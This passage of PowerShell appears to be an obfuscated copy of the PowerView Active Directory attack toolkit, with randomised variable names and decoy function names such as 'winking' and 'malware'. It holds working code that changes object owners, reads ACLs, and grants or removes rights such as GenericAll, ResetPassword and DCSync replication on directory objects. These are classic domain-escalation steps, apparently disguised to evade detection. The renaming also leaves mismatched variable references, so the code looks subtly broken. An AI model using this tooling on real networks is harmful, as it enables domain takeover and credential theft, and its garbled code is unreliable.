        if ($osehckuv99 -notmatch '^S-1-.*') {
            $XEITfJpQ99 = @{
                'Identity' = $osehckuv99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $XEITfJpQ99['Domain'] = $OyUhlxiF99 }
            if ($PSBoundParameters['Server']) { $XEITfJpQ99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['SearchScope']) { $XEITfJpQ99['SearchScope'] = $YtWADKZe99 }
            if ($PSBoundParameters['ResultPageSize']) { $XEITfJpQ99['ResultPageSize'] = $JYnIcwBJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $XEITfJpQ99['ServerTimeLimit'] = $fEdVcXRd99 }
            if ($PSBoundParameters['Tombstone']) { $XEITfJpQ99['Tombstone'] = $uomKXjrL99 }
            if ($PSBoundParameters['Credential']) { $XEITfJpQ99['Credential'] = $ZiReXCQu99 }
            $JLblXdBw99 = grow @PrincipalSearcherArguments
            if (-not $JLblXdBw99) {
                throw "Unable to resolve principal: $osehckuv99"
            }
            elseif($JLblXdBw99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $LGhgaolH99 = $JLblXdBw99.objectsid
        }
        else {
            $LGhgaolH99 = $osehckuv99
        }

        $RpZBVCYP99 = 0
        foreach($r in $Right) {
            $RpZBVCYP99 = $RpZBVCYP99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $RpZBVCYP99 = [System.DirectoryServices.ActiveDirectoryRights]$RpZBVCYP99

        $aCzrnrLk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$LGhgaolH99)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -eq [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99
            } elseif($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$KDNTGmOE99)
            } elseif($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$KDNTGmOE99), $CZaUEGxt99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -eq [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99, $yEQFtmfD99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99, $yEQFtmfD99, $KDNTGmOE99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $DmfLSijM99, $yEQFtmfD99, $KDNTGmOE99, $CZaUEGxt99
            }

        }
        else {

            if($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -eq [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99
            } elseif($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$KDNTGmOE99)
            } elseif($yEQFtmfD99 -eq $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$KDNTGmOE99), $CZaUEGxt99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -eq [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99, $yEQFtmfD99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99, $yEQFtmfD99, $KDNTGmOE99
            } elseif($yEQFtmfD99 -ne $null -and $KDNTGmOE99 -ne [String]::Empty -and $CZaUEGxt99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $aCzrnrLk99, $RpZBVCYP99, $PgtyTFWs99, $yEQFtmfD99, $KDNTGmOE99, $CZaUEGxt99
            }

        }
    }
}


function agonizing {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $aCzrnrLk99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $IRoqCjkh99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        $vvUAvNrH99 = grow @SearcherArguments -aCzrnrLk99 $IRoqCjkh99 -kaLEgole99 objectsid | Select-Object -ExpandProperty objectsid
        if ($vvUAvNrH99) {
            $cMrOXTqr99 = [System.Security.Principal.SecurityIdentifier]$vvUAvNrH99
        }
        else {
            Write-Warning "[agonizing] Error parsing owner identity '$IRoqCjkh99'"
        }
    }

    PROCESS {
        if ($cMrOXTqr99) {
            $xfOIjAld99['Raw'] = $True
            $xfOIjAld99['Identity'] = $aCzrnrLk99

            $mwCjDkwu99 = grow @SearcherArguments

            ForEach ($Object in $mwCjDkwu99) {
                try {
                    Write-Verbose "[agonizing] Attempting to set the owner for '$aCzrnrLk99' to '$IRoqCjkh99'"
                    $Entry = $mwCjDkwu99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($cMrOXTqr99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[agonizing] Error setting owner: $_"
                }
            }
        }
    }
}


function uphold {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $aCzrnrLk99,

        [Switch]
        $Sacl,

        [Switch]
        $MBygQsEI99,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $LpndzBiv99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $xfOIjAld99['SecurityMasks'] = 'Sacl'
        }
        else {
            $xfOIjAld99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $lASAYQeR99 = foaling @SearcherArguments

        $OPMazkYE99 = @{}
        if ($PSBoundParameters['Domain']) { $OPMazkYE99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $OPMazkYE99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['ResultPageSize']) { $OPMazkYE99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $OPMazkYE99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Credential']) { $OPMazkYE99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = interfered @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($lASAYQeR99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^S-1-.*') {
                    $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                }
                elseif ($JmddWUUS99 -match '^(CN|OU|DC)=.*') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[uphold] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $lASAYQeR99 = foaling @SearcherArguments
                        if (-not $lASAYQeR99) {
                            Write-Warning "[uphold] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                }
                elseif ($JmddWUUS99.Contains('.')) {
                    $zdhlwIap99 += "(|(samAccountName=$JmddWUUS99)(name=$JmddWUUS99)(dnshostname=$JmddWUUS99))"
                }
                else {
                    $zdhlwIap99 += "(|(samAccountName=$JmddWUUS99)(name=$JmddWUUS99)(displayname=$JmddWUUS99))"
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[uphold] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            if ($cqPynTGG99) {
                $lASAYQeR99.filter = "(&$cqPynTGG99)"
            }
            Write-Verbose "[uphold] uphold filter string: $($lASAYQeR99.filter)"

            $vDOGrGBR99 = $lASAYQeR99.FindAll()
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $LGhgaolH99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $LGhgaolH99 = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $xmLJbdon99 = Switch ($LpndzBiv99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $xmLJbdon99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $LGhgaolH99
                                $tqxxZBiO99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $LGhgaolH99
                            $tqxxZBiO99 = $True
                        }

                        if ($tqxxZBiO99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $JKdyuXVl99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $JKdyuXVl99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $JKdyuXVl99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $JKdyuXVl99[$_.Name] = $_.Value
                                    }
                                }
                                $VxSOxmQN99 = New-Object -TypeName PSObject -Property $JKdyuXVl99
                                $VxSOxmQN99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $VxSOxmQN99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[uphold] Error: $_"
                }
            }
        }
    }
}


function winking {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $EBXEWUzG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $bfrmITkR99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $FwiCFOpq99,

        [ValidateNotNullOrEmpty()]
        [String]
        $loXtaHfk99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $osehckuv99,

        [ValidateNotNullOrEmpty()]
        [String]
        $OyUhlxiF99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $LVyiTYEj99 = 'All',

        [Guid]
        $MGftSgxG99
    )

    BEGIN {
        $IQUfHtgg99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $IQUfHtgg99['Domain'] = $bfrmITkR99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $IQUfHtgg99['LDAPFilter'] = $FwiCFOpq99 }
        if ($PSBoundParameters['TargetSearchBase']) { $IQUfHtgg99['SearchBase'] = $loXtaHfk99 }
        if ($PSBoundParameters['Server']) { $IQUfHtgg99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $IQUfHtgg99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $IQUfHtgg99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $IQUfHtgg99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $IQUfHtgg99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $IQUfHtgg99['Credential'] = $ZiReXCQu99 }

        $XEITfJpQ99 = @{
            'Identity' = $osehckuv99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $XEITfJpQ99['Domain'] = $OyUhlxiF99 }
        if ($PSBoundParameters['Server']) { $XEITfJpQ99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $XEITfJpQ99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $XEITfJpQ99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XEITfJpQ99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $XEITfJpQ99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $XEITfJpQ99['Credential'] = $ZiReXCQu99 }
        $XBhfciRg99 = grow @PrincipalSearcherArguments
        if (-not $XBhfciRg99) {
            throw "Unable to resolve principal: $osehckuv99"
        }
    }

    PROCESS {
        $IQUfHtgg99['Identity'] = $EBXEWUzG99
        $JPrMaxQz99 = grow @TargetSearcherArguments

        ForEach ($NNylLkoA99 in $JPrMaxQz99) {

            $KDNTGmOE99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $mIQmpIyT99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($MGftSgxG99) {
                $GUIDs = @($MGftSgxG99)
            }
            else {
                $GUIDs = Switch ($LVyiTYEj99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($rKVKZZTO99 in $XBhfciRg99) {
                Write-Verbose "[winking] Granting principal $($rKVKZZTO99.distinguishedname) '$LVyiTYEj99' on $($NNylLkoA99.Properties.distinguishedname)"

                try {
                    $aCzrnrLk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$rKVKZZTO99.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $lwHCXLFy99 = New-Object Guid $GUID
                            $MRZielBi99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aCzrnrLk99, $MRZielBi99, $mIQmpIyT99, $lwHCXLFy99, $KDNTGmOE99
                        }
                    }
                    else {
                        $MRZielBi99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aCzrnrLk99, $MRZielBi99, $mIQmpIyT99, $KDNTGmOE99
                    }

                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[winking] Granting principal $($rKVKZZTO99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($NNylLkoA99.Properties.distinguishedname)"
                        $zXBNihGD99 = $NNylLkoA99.GetDirectoryEntry()
                        $zXBNihGD99.PsBase.Options.SecurityMasks = 'Dacl'
                        $zXBNihGD99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $zXBNihGD99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[winking] Error granting principal $($rKVKZZTO99.distinguishedname) '$LVyiTYEj99' on $($NNylLkoA99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function broke {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $EBXEWUzG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $bfrmITkR99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $FwiCFOpq99,

        [ValidateNotNullOrEmpty()]
        [String]
        $loXtaHfk99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $osehckuv99,

        [ValidateNotNullOrEmpty()]
        [String]
        $OyUhlxiF99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $LVyiTYEj99 = 'All',

        [Guid]
        $MGftSgxG99
    )

    BEGIN {
        $IQUfHtgg99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $IQUfHtgg99['Domain'] = $bfrmITkR99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $IQUfHtgg99['LDAPFilter'] = $FwiCFOpq99 }
        if ($PSBoundParameters['TargetSearchBase']) { $IQUfHtgg99['SearchBase'] = $loXtaHfk99 }
        if ($PSBoundParameters['Server']) { $IQUfHtgg99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $IQUfHtgg99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $IQUfHtgg99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $IQUfHtgg99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $IQUfHtgg99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $IQUfHtgg99['Credential'] = $ZiReXCQu99 }

        $XEITfJpQ99 = @{
            'Identity' = $osehckuv99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $XEITfJpQ99['Domain'] = $OyUhlxiF99 }
        if ($PSBoundParameters['Server']) { $XEITfJpQ99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $XEITfJpQ99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $XEITfJpQ99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XEITfJpQ99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $XEITfJpQ99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $XEITfJpQ99['Credential'] = $ZiReXCQu99 }
        $XBhfciRg99 = grow @PrincipalSearcherArguments
        if (-not $XBhfciRg99) {
            throw "Unable to resolve principal: $osehckuv99"
        }
    }

    PROCESS {
        $IQUfHtgg99['Identity'] = $EBXEWUzG99
        $JPrMaxQz99 = grow @TargetSearcherArguments

        ForEach ($NNylLkoA99 in $JPrMaxQz99) {

            $KDNTGmOE99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $mIQmpIyT99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($MGftSgxG99) {
                $GUIDs = @($MGftSgxG99)
            }
            else {
                $GUIDs = Switch ($LVyiTYEj99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($rKVKZZTO99 in $XBhfciRg99) {
                Write-Verbose "[broke] Removing principal $($rKVKZZTO99.distinguishedname) '$LVyiTYEj99' from $($NNylLkoA99.Properties.distinguishedname)"

                try {
                    $aCzrnrLk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$rKVKZZTO99.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $lwHCXLFy99 = New-Object Guid $GUID
                            $MRZielBi99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aCzrnrLk99, $MRZielBi99, $mIQmpIyT99, $lwHCXLFy99, $KDNTGmOE99
                        }
                    }
                    else {
                        $MRZielBi99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aCzrnrLk99, $MRZielBi99, $mIQmpIyT99, $KDNTGmOE99
                    }

                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[broke] Granting principal $($rKVKZZTO99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($NNylLkoA99.Properties.distinguishedname)"
                        $zXBNihGD99 = $NNylLkoA99.GetDirectoryEntry()
                        $zXBNihGD99.PsBase.Options.SecurityMasks = 'Dacl'
                        $zXBNihGD99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $zXBNihGD99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[broke] Error removing principal $($rKVKZZTO99.distinguishedname) '$LVyiTYEj99' from $($NNylLkoA99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function malware {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $XQOKQXGr99,

        [Switch]
        $MBygQsEI99,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $LpndzBiv99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
